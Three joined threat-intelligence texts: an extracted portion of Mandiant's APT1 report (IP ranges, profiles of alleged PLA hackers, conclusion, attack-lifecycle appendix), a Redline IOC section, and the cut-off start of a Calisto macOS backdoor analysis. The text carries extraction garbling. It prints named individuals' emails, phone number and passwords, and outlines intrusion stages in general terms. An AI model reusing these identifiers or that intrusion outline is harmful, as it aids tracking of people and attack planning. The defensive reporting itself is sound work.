China Unicom Shanghai Network 68 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network 10 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network 7114.80.0.0 - 114.95.255.255China Telecom Shanghai Network 5139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network 4 222.64.0.0 - 222.73.255.25China Telecom Shanghai Network 3116.224.0.0 Œ 116.239.255.255China Telecom Shanghai Network 16Other (Non-Shanghai)These statistics indicate that there are over 400 IP addresses in the U.S. alone that may have active APT1 servers, which are as-yet uncon˜rmed by Mandiant. Additionally, although we know of over 2,500 APT1 FQDNs, there are many APT1 FQDNs that we have not attributed to APT1, which have resolved to even more IP addresses. We estimate (conservatively) that APT1™s current hop infrastructure includes over 1,000 servers. Mandiant APT1 51 www.mandiant.com APT1: IDENTITIESAPT1 is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the PLA behind APT1™s keyboards, we have decided to expose the identities of a select number of APT1 personas. These actors have made poor operational security choices, facilitating our research and allowing us to track their activities. They are some of the authors of APT1™s digital weapons and the registrants of APT1 FQDNs and email accounts. These actors have expressed interest in China™s cyber warfare efforts, disclosed their locations to be the Pudong New Area of Shanghai, and have even used a Shanghai mobile phone number to register email accounts used in spear phishing campaigns.Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular comprehensive picture. Often this uni˜ed viewpoint reveals not only the group attribution, but coherent pockets of behavior within the group which we perceive to be either small teams or individual actors. We refer to these as ﬁpersonas.ﬂ As APT1 personas manage technical resources such as hops and Fully Quali˜ed Domain Names (FQDNs), they have been observed to de-con˛ict their actions amongst themselves by coordinating the use of speci˜c hops, FQDNs, CNO tools (e.g., malware) and ports.One additional element working in our favor as threat trackers is the Great Firewall of China (GFWoC). Like many Chinese hackers, APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party of China (CPC), which deployed the GFWoC as a censorship measure to restrict access to web sites such as google. com, facebook.com, and twitter.com. Additionally, the nature of the hackers™ work requires them to have control of network infrastructure outside the GFWoC. This creates a situation where the easiest way for them to log into Facebook and Twitter is directly from their attack infrastructure. Once noticed, this is an effective way to discover their real identities.What is the Great Firewall of China?The ﬁGreat Firewallﬂ is a term used to describe the various technical methods used by the Chinese government to censor and block or restrict access to Internet services and content that the government considers sensitive or inappropriate. ﬁInappropriateﬂ content ranges from pornography to political dissent, and from social media to news sites that may portray China or Chinese of˜cials in a negative light. The ﬁGreat Firewallﬂ uses methods such as blocking particular IP addresses; blocking or redirecting speci˜c domain names; ˜ltering or blocking any URL containing target keywords; and rate-limiting or resetting TCP connections. Chinese censors also routinely monitor Chinese websites, blogs, and social media for ﬁinappropriateﬂ content, removing it when found. As a result, Chinese citizens who wish to access censored content must resort to workarounds such as the use of encryption. China continues to improve and further restrict Internet access, most recently (in December 2012) by blocking additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks. Mandiant APT1 52 www.mandiant.com APT1 Hacker Pro˜le: Ugly Gorilla (Wang Dong/ )The story of ﬁUgly Gorillaﬂ (UG) dates back to 2004. A then-professor named Zhang Zhaozhong ( ), now a retired rear admiral, was in the process of helping to shape the future of China™s information warfare strategy. 40 Professor Zhang was already a strong advocate for the ﬁinformationizationﬂ of military units, and had published several works on military strategy including ﬁNetwork Warfareﬂ ( ) and ﬁWinning the Information Warﬂ ( ). As Director of the ﬁMilitary Technology and Equipmentﬂ () department at China™s National Defense University (), professor Zhang was invited to take part in an event titled ﬁOutlook 2004: The International Strategic Situationﬂ in January 2004.During the online question and answer session hosted by the PLA Daily™s ( ) China Military Online (), one young man with the nickname ﬁGreen˜eldﬂ () posed a particularly prescient question.ﬁProfessor Zhang, I read your book ™Network Warfare‚ and was deeply impressed by the views and arguments in the book. It is said that the U.S. military has set up a dedicated network force referred to as a ‚cyber army.™ Does China have a similar force? Does China have cyber troops?ﬂ Š UglyGorilla 16 Jan 2004Like all users of the China Military Online (chinamil) forums, ﬁGreen˜eldﬂ was required to sign up with an email address and specify a small bit of information about himself. Thankfully, the Internet™s tendency to immortalize data preserved the pro˜le details for us.40 http://www.chinamil.com.cn/site1/g˛t/2004-09/30/content_705216.htm FIGURE 26: Professor Zhang () 16 Jan 2004, source http://www.chinamil.com.cn/site1/g˚t/2004-09/30/ content_705216.htm Mandiant APT1 53 www.mandiant.com FIGURE 27: UglyGorilla chinamil pro˜le, source: http://bbs.chinamil.com.cn/forum/bbsui.jsp?id=(o)5681 Mandiant APT1 54 www.mandiant.com FIGURE 28: UglyGorilla chinamil pro˜le translated by translate.google.com/Thus, the persona we call ﬁUglyGorillaﬂ (UG) was ˜rst documented. In addition to his email address, UG listed his ﬁreal nameﬂ as ﬁJackWangﬂ. Within the year, we saw the ˜rst evidence of UG honing the tools of his trade. On October 25, 2004, UG registered the now infamous ﬁhugesoft.orgﬂ zone. The ﬁhugesoft.orgﬂ zone and its many APT1-attributed hostnames have remained active and under the continuous ownership of UG, and are still active as of the time of this report. Registration information was most recently updated on September 10, 2012, extending the registration period for the zone well into 2013. We may see UG relinquish this and other attributed zones as a result of this reporting, in an effort to deter further tracking and attribution.In 2007, UG authored the ˜rst known sample of the MANITSME family of malware and, like a good artist, left his clearly identi˜able signature in the code: ﬁv1.0 No Doubt to Hack You, Writed by UglyGorilla, 06/29/2007ﬂsic. UG™s tendency to sign his work is present in the strings he chooses for hostnames and even within the communications protocols his backdoors use. For example, What is a meat chicken?!? Chinese Hacker Slang: ﬁroujiﬂ () Š Meat Chicken n. Š An infected computerExample strings from MANITSME samples: ﬁd:\\\\My Documents\\\\Visual Studio Projects\\\\rouji\\\\SvcMain.pdbﬂExamples from other malware– ﬁconnecting to roujiﬂ ﬁwelcome to ***(rouji)ﬂ Mandiant APT1 55 www.mandiant.com hostnames within other APT1-attributed FQDNs such as ﬁarrowservice.netﬂ and even the newer ﬁmsnhome.orgﬂ continue to leave UG™s imprint (note the ﬁugﬂ in the domains): »ug-opm.hugesoft.org»ug-rj.arrowservice.net»ug-hst.msnhome.orgThough these kinds of obvious attribution links tapered off as UG became more experienced, the protocol signatures of his tools such as MANITSME and WEBC2-UGX continue to be used by APT1 attackers based out of Shanghai.UG™s consistent use of the username ﬁUglyGorillaﬂ across various Web accounts has left a thin but strong thread of attribution through many online communities. In most instances, content such as hacking tools, information security topics, and association with the Shanghai locality are reasonable ways to eliminate false positives. For example, in February of 2011, the disclosure of all registered ﬁrootkit.comﬂ accounts published by Anonymous included the user ﬁuglygorillaﬂ with the registered email address uglygorilla@163.com. This is the same email used to register for the 2004 PLA forum and the zone hugesoft.org. Included in the rootkit.com leaked account information was the IP address 58.246.255.28, which was used to register UG™s account directly from the previously discussed APT1 home range: 58.246.0.0/15.In a few of these accounts, UG has listed something other than ﬁJackWangﬂ as his real name. On February 2, 2006, a user named ﬁuglygorillaﬂ uploaded a ˜le named ﬁmailbomb_1.08.zipﬂ (a bulk email tool) to the Chinese developer site PUDN (www.pudn.com). His account details from PUDN included the real name ﬁWang Dongﬂ ( ).FIGURE 29: Wang Dong™s Uploaded Files to pudn.comIt is important to note two things at this point. First, Chinese names begin with the surname. So ﬁWangﬂ is the last name in . Second, it is a fairly common practice for the Chinese, even in China, to choose an English ˜rst name. Thus ﬁJackWangﬂ may not have been an alias at all. Mandiant APT1 56 www.mandiant.com APT1 Hacker Pro˜le: DOTA Another APT1 persona is ﬁdotaﬂ (DOTA), named for his strong tendency to use variants of that name in almost all accounts he creates and uses from his attack infrastructure. DOTA may have taken his name from the video game ﬁDefense of the Ancientsﬂ which is commonly abbreviated DotA, though we have yet to observe any direct link or other direct reference to the game.We have monitored the creation of dozens of accounts, including d0ta010@hotmail.com and dota.d013@gmail.com, and have often seen DOTA create several sequential accounts (for example dota.d001 through dota.d015) at web- based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact email address when signing up for other services. For example, DOTA (originating from the APT1 home range IP address 58.247.26.59) with a Simpli˜ed Chinese keyboard setting used the email address ﬁd0ta001@hotmail.comﬂ from his US hop to register the Facebook user ﬁdo.ta.5011ﬂ(Facebook user id: 100002184628208).Some services, such as Google™s Gmail, require users to provide a phone number during the registration process to which they send a validation ﬁtext messageﬂ containing a veri˜cation code. The user must then input the veri˜cation code on the website to ˜nalize registration. In an observed session on a compromised machine, DOTA used the phone number ﬁ159-2193-7229ﬂ to receive a veri˜cation text message from Google, which he then submitted to their page within seconds. Telephone numbers in China are organized into a hierarchy containing an area code, pre˜x, and line number similar to phone numbers in the United States, with the addition that a few area codes are allocated for use by mobile phone providers. The phone number ﬁ159-2193-7229ﬂ breaks down into the ﬁ159ﬂ area code, which indicates a mobile phone provided by China Mobile, and the pre˜x ﬁ2193ﬂ, which indicates a Shanghai mobile number. This means at the very least that the number was initially allocated by China Mobile for use in Shanghai. The speed of DOTA™s response also indicates that he had the phone with him at the time.We have also observed DOTA using the names Rodney and Raith to communicate via email in ˛uent English with various targets including South East Asian military organizations in Malaysia and the Philippines. It is unclear if this Gmail account is used exclusively for facilitating his CNO mission, but much of the traf˜c indicates its use in both simple phishing attacks, as well as more sophisticated email based social engineering.DOTA : a Harry ﬁPoterﬂ fan?The DOTA persona also appears to be a fan of the popular ﬁHarry Potterﬂ character, frequently setting accounts ﬁsecurity questionsﬂ such as ﬁWho is your favorite teacher?ﬂ and ﬁWho is your best childhood friend?ﬂ to the values ﬁHarryﬂ and ﬁPoterﬂ and creating accounts such as poter.spo1@gmail. com with the alternate email address set to dota.sb005@gmail.com. Mandiant APT1 57 www.mandiant.com FIGURE 30: dota.d001@gmail.com (inbox view)41When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management becomes a signi˜cant undertaking. Consequently, most APT1 attackers use passwords that are either pattern-based, such as the keyboard pattern ﬁ1qaz2wsxﬂ or highly memorable, using ﬁrootkitﬂ as a password on the information security research site rootkit.com. Like many APT1 attackers, DOTA frequently uses keyboard based patterns as passwords such as ﬁ1qaz@WSX#EDCﬂ. However, there is one password ﬁ2j3c1kﬂ extensively used by DOTA that is not based on a keyboard pattern, though he may not be the only APT1 actor that uses it. A numbered ﬁjﬂ, followed by a numbered ﬁcﬂ, and then a numbered ﬁkﬂ is likely shorthand (ﬁjﬂ/ﬂcﬂ/ﬂkﬂ) for the ju/chu/ke () organizational structure (translated to Bureau/Division (or Of˜ce)/Section) widely used within PLA General Staff Department organizations. Project 2049 describes the typical PLA organizational structure as, ﬁBureau-level directors – oversee between six and 14 subordinate sites or of˜ces chu; – Sites/of˜ces under bureaus are further divided into sections 41 This is a screen capture of DOTA accessing his Gmail account while using a compromised system on APT1™s attack infrastructure. Mandiant APT1 58 www.mandiant.com ke; .42 Given this pattern, it is likely that the password ﬁ2j3c1kﬂ stands for 2nd Bureau Unit 61398, 3rd Division, 1st Section, demonstrating that those who use these patterns are working together and af˜liate themselves to the 2nd Bureau.Attempting to track the DOTA persona back to a particular individual is dif˜cult; the trail of his activity does not link as clearly to a real world identity. However, Mandiant has been able to establish a clear link between UG and DOTA. Speci˜cally, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges. The coordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes it highly likely that, at the very least, UG and DOTA know each other personally and likely even work together. APT1 Hacker Pro˜le: SuperHard (Mei Qiang/)The third and ˜nal persona we are revealing has been dubbed ﬁSuperHardﬂ (SH). SH was ˜rst observed as a tool author, and is either the creator or a signi˜cant contributor to the AURIGA and BANGAT malware families (covered in Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the tools. In particular, elements of the portable executable (PE) ˜le™s VS_VERSIONINFO structure are frequently set to ﬁSuperHard,ﬂ or cmd.exe copies are modi˜ed from ﬁMicrosoft corp.ﬂ to ﬁsuperhard corp.ﬂAdditionally, many of SH™s tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH™s tools are observed in use by other APT1 personae and in several instances, other APT groups we track. Given that SH™s tools are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is primarily involved in research and development for APT1.Once again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.com account ﬁSuperHard_Mﬂ was originally registered from the IP address 58.247.237.4, within one of the known APT1 egress ranges, and using the email address ﬁmei_qiang_82@sohu.comﬂ. We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name ﬁMei Qiangﬂ () is a reasonably common Chinese last/˜rst name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several ﬁMei Qiangﬂ identities online that claim a birth year of 1982, making attribution to an individual dif˜cult.Fortunately, we can use SH™s email address to connect him to a number of Websites and forums on which he registered and contributed using that address. Many of these accounts reveal details that reinforce SH™s link to the ﬁmei_qiang_82@sohu.comﬂ43 email address and APT1 af˜liation, such as SH offering to write Trojans for money, his involvement with malicious Windows kernel research (incidentally, also commented on by ﬁgreen˜eldﬂ, possibly UG), and more recently, being local to Shanghai™s Pudong New Area. 4442 Mark A. Stokes, Jenny Lin, and L.C. Russell Hsiao, ﬁThe Chinese People™s Liberation Army Signals Intelligence and Cyber Reconnaissance Infrastructure,ﬂ Project 2049 Institute (2011): 6-7, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, accessed February 6, 2013.43 Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of Beijing China.44 hxxp://tuziw.com/index.php?m=ta&id=1864863532 Mandiant APT1 59 www.mandiant.com CONCLUSIONIn a State that rigorously monitors Internet use, it is highly unlikely that the Chinese Government is unaware of an attack group that operates from the Pudong New Area of Shanghai. The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes the parallels between APT1 and PLA Unit 61398.TABLE 12: Matching characteristics between APT1 and Unit 61398CharacteristicAPT1 (as directly observed)Unit 61398 (as reported)Mission area»Steals intellectual property from English-speaking organizations»Targets strategic emerging industries identi˜ed in China™s 12th Five Year Plan »Conducts computer network operations against English-speaking targetsTools, Tactics, and Procedures (TTPs)»Organized, funded, disciplined operators with speci˜c targeting objectives and a code of ethics (e.g., we have not witnessed APT1 destroy property or steal money which contrasts most ﬁhackersﬂ and even the most sophisticated organize crime syndicates)»Conducts military-grade computer network operationsScale of operations»Continuously stealing hundreds of terabytes from 141 organizations since at least 2006; simultaneously targeting victims across at least 20 major industries»Size of ﬁhopﬂ infrastructure and continuous malware updates suggest at least dozens (but probably hundreds) of operators with hundreds of support personnel »As part of the PLA, has the resources (people, money, in˛uence) necessary to orchestrate operation at APT1™s scale »Has hundreds, perhaps thousands of people, as suggested by the size for their facilities and position within the PLA Mandiant APT1 60 www.mandiant.com CharacteristicAPT1 (as directly observed)Unit 61398 (as reported)Expertise of personnel»English language pro˜ciency»Malware authoring»Computer hacking»Ability to identify data worth stealing in 20 industries»English language requirements»Operating system internals, digital signal processing, steganography»Recruiting from Chinese technology universitiesLocation»APT1 actor used a Shanghai phone number to register email accounts»Two of four ﬁhomeﬂ Shanghai net blocks are assigned to the Pudong New Area»Systems used by APT1 intruders have Simpli˜ed Chinese language settings»An APT1 persona™s self-identi˜ed location is the Pudong New Area»Headquarters and other facilities spread throughout the Pudong New Area of Shanghai, ChinaInfrastructure»Ready access to four main net blocks in Shanghai, hosted by China Unicom (one of two Tier 1 ISPs in China) »Some use of China Telecom IP addresses (the other Tier 1 ISP) »Co-building network infrastructure with China Telecom in the name of national defenseCombining our direct observations with carefully researched and correlated ˜ndings; we believe the facts dictate only two possibilities:EitherA secret, resourced organization full of mainland Chinese speakers with direct access to Shanghai-based telecommunications infrastructure is engaged in a multi-year, enterprise scale computer espionage campaign right outside of Unit 61398™s gates, performing tasks similar to Unit 61398™s known mission. OrAPT1 is Unit 61398. Mandiant APT1 61 www.mandiant.com APPENDIX A: HOW DOES MANDIANT DISTINGUISH THREAT GROU PS?Mandiant uses the term threat group to refer to a collection of intruders who are working together to target and penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is ultimately de˜ned by people and not by methodology. However, de˜ning a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting behind the keyboard it may be dif˜cult to determine whether two different intrusion events were conducted by the same person, by two people who are working together, by two unrelated people who independently compromised the same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise the same target.Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:»The method the thief used to break in;»The tools used to open the safe;»Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to grab something of value;»Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as ˜ngerprints; or whether he was not very careful, but simply relied on being ﬁstealthy enoughﬂ to not get caught. Mandiant APT1 62 www.mandiant.com Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another. In a similar way, cyber intruders leave behind various digital ﬁ˜ngerprints.ﬂ They may send spear-phishing emails from a speci˜c IP address or email address. Their emails may contain certain patterns of subject lines. Their ˜les have speci˜c names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another. Digital ﬁ˜ngerprintsﬂ do not all carry equal weight in attribution analysis. Their validity or value as indicators of a speci˜c threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as HTRAN is not unique and not useful Š by itself Š as an indicator of a speci˜c threat group. In contrast, the use of a speci˜c, custom backdoor not observed elsewhere is a much stronger indicator Š although it is generally still not suf˜cient, on its own, for positive attribution.At the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same person or group of people were involved. Mandiant APT1 63 www.mandiant.com APPENDIX B: APT AND THE ATTA CK LIFECYCLEWhile most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese APT lifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages of Mandiant™s Attack Lifecycle model and give an overview of what APT activity looks like in each stage. The stages between ﬁEstablish Footholdﬂ and ﬁComplete Missionﬂ do not have to occur in this order every time. In fact, once established within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying data of interest, moving laterally to access that data, and ﬁcompleting missionﬂ by stealing the data. This will generally continue inde˜nitely until they are removed entirely from the network. Initial CompromiseThe Initial Compromise stage represents the methods that intruders use to penetrate a target organization™s network. APT intruders frequently target individual users within a victim environment. As such, the most commonly observed method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to a malicious ˜le, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer is vulnerable to the attacker™s exploit code. APT groups may also look for vulnerable Internet-facing web servers and upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in public-facing infrastructure.Establish FootholdEstablishing a foothold ensures that APT threat groups can access and control one or more computers within the victim organization from outside the network. APT groups can utilize public backdoors (Gh0st RAT and Poison Ivy are common examples), ﬁundergroundﬂ backdoors found in hacker websites or obtained through personal connections, and ﬁcustomﬂ backdoors that they developed themselves. These backdoors usually establish an outbound connection from the victim network to a computer controlled by the attackers. The communication methods used by the backdoors vary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give the APT groups basic access to a system, typically through a command shell or graphical user interface. Mandiant APT1 64 www.mandiant.com Escalate PrivilegesEscalating privileges involves acquiring items that will allow access to more resources within the victim environment. Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI certi˜cates, VPN client software, privileged computers, or other resources required to access data or systems of interest. APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user accounts. This is typically accomplished by ˜rst ﬁdumpingﬂ password hashes from a computer, server, or (preferably) Domain Controller. The attacker may be able to obtain legitimate account passwords by ﬁcrackingﬂ password hashes. Alternately, the attacker may leverage the hashes themselves in a ﬁpass-the-hashﬂ attack, where the hashed password itself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily leveraged for both password dumping and pass-the-hash attacks.Internal ReconnaissanceIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. APT threat actors use built-in operating system commands (such as the Windows ﬁnetﬂ commands) to obtain information about the internal network, including computers, trust relationships, users, and groups. In order to identify data of interest, they may perform directory or network share listings, or search for data by ˜le extension, key word, or last modi˜ed date. Data of interest may take many forms, but most commonly consists of documents, the contents of user email accounts, or databases. Therefore ˜le servers, email servers, and domain controllers are customary targets of internal reconnaissance. Some APT groups utilize custom scripts in order to automate the process of reconnaissance and identi˜cation of data of interest. Move LaterallyIn most cases, the systems that the intruders initially compromise do not contain the data that they want. Therefore they must move laterally within a network to other computers that either contain that data or allow them to access it. APT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and devices inside of a victim network. They commonly use compromised credentials with PsExec and / or the Windows Task Scheduler (ﬁatﬂ command) to execute commands and install malware on remote systems. Maintain PresenceIn this stage, the intruders take actions to ensure continued control over key systems in the network environment from outside of the network. APT groups often install new backdoors (e.g., different backdoors than the ones installed in the Establish Foothold phase) in the environment during the course of the campaign. They may install different families of malware on multiple computers and use a variety of command and control addresses, presumably for redundancy and to make it dif˜cult to identify and remove all of their access points. Additionally, APT groups may establish methods of network access that do not involve backdoors, so that they can maintain a presence even if network security personnel discover and remove their malware. These methods may include the use of valid PKI or VPN credentials, allowing the intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources. In some instances APT threat actors have been able to circumvent two-factor authentication to maintain access to a victim network and its resources. Mandiant APT1 65 www.mandiant.com Complete MissionThe main goal of APT intrusions is to steal data, including intellectual property, business contracts or negotiations, policy papers or internal memoranda. Once APT groups ˜nd ˜les of interest on compromised systems, they often pack them into archive ˜les before stealing them. They most commonly use the RAR archiving utility for this task, but may also use other publicly available utilities such as ZIP or 7-ZIP. APT threat actors not only compress data, but frequently password-protect the archive. From there they use a variety of methods to transfer ˜les out of the victim network, including FTP, custom ˜le transfer tools, or existing backdoors.

APT1 Indicators and Using RedlineŽ With the release of Mandiant™s report, APT1: Exposing One of China™s Cyber Espionage Units, we are providing a set of APT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal. IOCs can be used in investigations to ˜nd unknown evils or for detection of already known threats. The IOCs included in Appendix G ˜t the latter; however, keep in mind that APT1 does update their tools, and there are certainly malware variants and new families of malware that will not be detected with this set of IOCs. To ˜nd out more about the report or the digital appendices (to include downloading the set of APT1 IOCs in Appendix G: IOCs) go to http://www.mandiant. com/apt1. IOCs can be used in conjunction with Redline, Mandiant™s free host-based investigative tool, or with Mandiant Intelligent Response® (MIR), Mandiant™s commercial host-based investigative tool. Mandiant™s customers who have licensed MIR can simply import a zip ˜le of the IOCs into their controllers. For those without MIR, Redline can be downloaded from Mandiant™s web site at http://www.mandiant.com/resources/download/redline. Remember to always test new IOCs before using them in a production environment.What Are IOCs?Mandiant has developed an open, extendable standard for de˜ning and sharing threat information in a machine-readable format. Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with grouping and logical operators to provide advanced threat detection capability. If you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org. Mandiant APT1 71 www.mandiant.com What Is Redline?Redline is Mandiant™s free tool for investigating hosts for signs of malicious activity through memory and ˜le analysis, and subsequently developing a threat assessment pro˜le. Redline provides several bene˜ts including the following:RAPID TRIAGEWhen confronted with a potentially compromised host, responders must ˜rst assess whether the system has active malware. Without installing software or disrupting the current state of the host, Redline thoroughly audits all currently- running processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire ˜le structure, network state, and system memory. Redline will also compare any MD5 value it collects, analyzes, and visualizes against an MD5 whitelist. Users can further analyze and view imported audit data using Redline™s Timeline functionality, which includes capabilities to narrow and ˜lter results around a given timeframe with the TimeWrinklesŽ and TimeCrunchesŽ features. REVEALS HIDDEN MALWARE The Redline Portable Agent can collect and analyze a complete memory image, working below the level at which kernel rootkits and other malware-hiding techniques operate. Many hiding techniques become extremely obvious when examined at the physical memory level, making memory analysis a powerful tool for ˜nding malware. It also reveals ﬁmemory onlyﬂ malware that is not present on disk.GUIDED ANALYSIS Mandiant™s Redline tool streamlines memory analysis by providing a proven work˛ow for analyzing malware based on relative priority. This takes the guesswork out of task and time allocation, allowing investigators to provide a focused response to the threats that matter most. Redline calculates a ﬁMalware Risk Indexﬂ that highlights processes more likely to be worth investigating, and encourages users to follow investigative steps that suggest how to start. As users review more audits from clean and compromised systems, they build up the experience to recognize malicious activity more quickly. As you investigate a system, here™s how Redline will help you focus your attention on the most productive data: INVESTIGATIVE STEPSRedline can collect a daunting amount of raw information. Its investigative steps help provide a starting place by highlighting speci˜c data and providing views that are most commonly productive in identifying malicious processes. Unless you are pursuing a speci˜c ﬁleadﬂ, we recommend working through the steps in order, examining the information for entries that don™t match your expectations.The key to becoming an effective investigator is to review Redline data from a variety of ﬁcleanﬂ and ﬁcompromisedﬂ systems. Over time, your sense of which entries are normal and which are of concern will develop quickly as you view more data. Mandiant APT1 72 www.mandiant.com MALWARE RISK INDEX SCORINGRedline analyzes each process and memory section using a variety of rules and techniques to calculate a ﬁMalware Risk Indexﬂ for each process. This score is a helpful guide to identifying those processes that are more likely to be worth investigating. Processes at the highest risk of being compromised by malware are highlighted with a red badge. Those with some risk factors have a grey badge, and low-risk processes have no badge.The MRI is not an absolute indication of malware. During an investigation you can re˜ne the MRI scoring by adjusting speci˜c hits (identifying false positives and false negatives) for each process, adding your own hits, and generally tuning the results.IOCsRedline provides the option of performing IOC analysis in addition to MRI scoring. Supplied a set of IOCs, the Redline Portable Agent will be automatically con˜gured to gather the data required to perform a subsequent IOC analysis; after the analysis is run, IOC hit results are available for further investigation.In addition, Redline provides the ability to create an IOC Collector. This feature enables the collection of data types required for matching a set of IOCs. WORKS WITH MIRCombined with MIR, Redline is a powerful tool for accelerated live response. Here™s a typical case: »IDS or other system detects suspicious activity on a host»From MIR, an investigator launches a remote live response script»The MIR Agent running on the host captures and analyzes memory locally, streaming back a small XML audit that downloads in minutes rather than hours»From MIR, the user can open the audit directly in Redline»Using Redline, the investigator quickly identi˜es a malicious process, and writes an IOC describing the forensic attributes found in Redline»Using MIR and MCIC, the investigator is quickly able to sweep for that IOC and discover all other systems on the network with the same (or similar) malware running Mandiant APT1 73 www.mandiant.com Have MIR Customers had Access to these IOCs Before?These IOCs are new! However, much of the detection capability in this set of indicators has already been available to our MIR customers. The IOCs may look different though as a result of improvements in creation and testing. Mandiant started 2013 with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management process, and IOC testing. The majority of these indicators, or modi˜ed versions of them, will be integrated into the next IOC release.What Is the FAMILY Designator in This Set of IOCs? We are using a new IOC designator in these IOCs called ﬁ(FAMILY).ﬂ Mandiant™s Threat Intelligence Unit tracks malware by common features seen in groups of binaries. We call those groupings of binaries ﬁfamilies.ﬂ The IOCs included in this appendix are representatives of families of malware used by APT1. The new designator follows the family name in the ﬁNameﬂ ˜eld of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole family, not just one sample. Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From Mandiant?In many cases we have combined information that previously would have been in several indicators into a single indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate appendices (such as FQDNs and IPs).Additionally, some IOCs in this set are using ˜le permutation blocks to catch variants of malware that might not be detected otherwise.What Is a File Permutation block? It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two pieces. For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.Will You Update These IOCs? It is likely that we will make some changes to the IOCs in Appendix G as we get feedback. If updated, the updates will be available in the same location as the report http://www.mandiant.com/apt1. Will You Be Releasing More IOCs Like This? Currently, there are no plans for additional public releases of this magnitude.

macOS\\nThe first member of the Proton malware family?\\nBy Mikhail Kuzin, Sergey Zelensky\\non July 20, 2018. 10:00 am\\nAn interesting aspect of studying a particular piece of malware is tracing its evolution and observing how the creators gradually add new monetization or entrenchment techniques. Also of interest are developmental prototypes that have had limited distribution or not even occurred in the wild. We recently came across one such sample: a macOS backdoor that we named Calisto.\\nThe malware was uploaded to VirusTotal way back in 2016, most likely the same year it was created. But for two whole years, until May 2018, Calisto remained off the radar of antivirus solutions, with the first detections on VT appearing only recently.\\nMalware for macOS is not that common, and this sample was found to contain some suspiciously familiar features. So we decided to unpick Calisto to see what it is and why its development was stopped (or was it?).\\nPropagation\\nWe have no reliable information about how the backdoor was distributed. The Calisto installation file is an unsigned DMG image under the guise of Intego’s security solution for Mac. Interestingly, Calisto’s authors chose the ninth version of the program as a cover which is still relevant.\\nFor illustrative purposes, let’s compare the malware file with the version of Mac Internet Security X9 downloaded from the official site.\\nBackdoor\\nIntego Mac Internet Security 2018\\nUnsigned\\nSigned by Intego\\nIt looks fairly convincing. The user is unlikely to notice the difference, especially if he has not used the app before.\\nInstallation\\nAs soon as it 